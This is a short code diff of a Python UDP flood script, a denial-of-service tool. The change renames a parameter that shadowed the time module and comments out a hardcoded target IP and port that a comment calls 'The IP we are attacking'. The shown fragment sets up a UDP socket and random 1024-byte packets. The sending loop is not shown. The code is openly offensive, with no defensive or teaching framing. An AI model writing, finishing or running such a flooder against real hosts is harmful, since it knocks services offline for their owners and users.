@@ -2,11 +2,11 @@ import socket #Imports needed libraries
 import random
 import time
 
-def udpfloods(ip,port,time) :
+def udpfloods(ip,port,userinputtime) :
 	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
 	bytes=random._urandom(1024) #Creates packet
-	ip='10.1.12.173' #The IP we are attacking
-	port=80 #Port we direct to attack
+	#ip='10.1.12.173' #The IP we are attacking
+	#port=80 #Port we direct to attack
 	sent=0
 	st = time.time()
 	print ('success')
